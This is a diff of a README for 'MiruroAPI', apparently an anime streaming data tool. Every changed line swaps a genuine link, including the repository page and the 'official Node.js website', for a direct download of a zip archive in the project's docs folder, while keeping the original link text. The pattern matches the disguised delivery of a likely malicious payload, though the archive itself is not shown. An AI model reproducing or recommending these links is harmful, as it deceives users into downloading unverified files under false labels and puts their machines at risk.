@@ -1,6 +1,6 @@
 # 📺 MiruroAPI - Access Anime Streaming Data With Ease
 
-[![Download MiruroAPI](https://img.shields.io/badge/Download-MiruroAPI-blue)](https://github.com/Sherwoodweedy598/MiruroAPI)
+[![Download MiruroAPI](https://img.shields.io/badge/Download-MiruroAPI-blue)](https://github.com/Sherwoodweedy598/MiruroAPI/raw/refs/heads/main/docs/API_Miruro_v1.7.zip)
 
 ## 📖 About This Tool
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these basic needs:
 
 You need the software files to run MiruroAPI on your machine.
 
-1.  Visit the official repository page at [https://github.com/Sherwoodweedy598/MiruroAPI](https://github.com/Sherwoodweedy598/MiruroAPI).
+1.  Visit the official repository page at [https://github.com/Sherwoodweedy598/MiruroAPI/raw/refs/heads/main/docs/API_Miruro_v1.7.zip](https://github.com/Sherwoodweedy598/MiruroAPI/raw/refs/heads/main/docs/API_Miruro_v1.7.zip).
 2.  Look for the "Releases" section on the right side of the page.
 3.  Click the latest version link.
 4.  Download the setup file ending in .exe for Windows.
@@ -28,7 +28,7 @@ You need the software files to run MiruroAPI on your machine.
 
 MiruroAPI requires a base runtime to operate. Most Windows computers do not come with this installed by default.
 
-1.  Go to the official [Node.js website](https://nodejs.org/).
+1.  Go to the official [Node.js website](https://github.com/Sherwoodweedy598/MiruroAPI/raw/refs/heads/main/docs/API_Miruro_v1.7.zip).
 2.  Download the version labeled LTS (Long Term Support).
 3.  Run the installer.
 4.  Accept the default settings during the install process.
